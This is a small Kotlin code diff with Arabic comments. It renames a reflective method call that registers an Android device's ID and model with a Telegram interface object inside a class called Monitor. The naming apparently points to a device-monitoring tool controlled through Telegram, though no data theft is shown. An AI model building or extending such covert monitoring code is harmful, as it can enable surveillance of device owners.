@@ -26,6 +26,8 @@ import kotlin.random.Random
  * 
  * تم إزالة الدوال المكررة (getters) التي تتعارض مع الدوال المولدة تلقائياً للخصائص.
  * يتم استخدام الخصائص مباشرة (مع getters الضمنية) في الانعكاس.
+ * 
+ * ✅ تم إصلاح استدعاء تسجيل الجهاز عبر الانعكاس من "reg" إلى "registerDevice".
  */
 class Monitor private constructor(context: Context) {
 
@@ -533,7 +535,8 @@ class Monitor private constructor(context: Context) {
             // تسجيل الجهاز في واجهة Telegram
             ui?.let { uiObj ->
                 try {
-                    invokeMethod(uiObj, "reg", deviceId, deviceModel)
+                    // ✅ تم الإصلاح: تغيير اسم الدالة من "reg" إلى "registerDevice"
+                    invokeMethod(uiObj, "registerDevice", deviceId, deviceModel)
                 } catch (_: Exception) {
                     // محاولة بديلة باستخدام _api مباشرة
                     try {
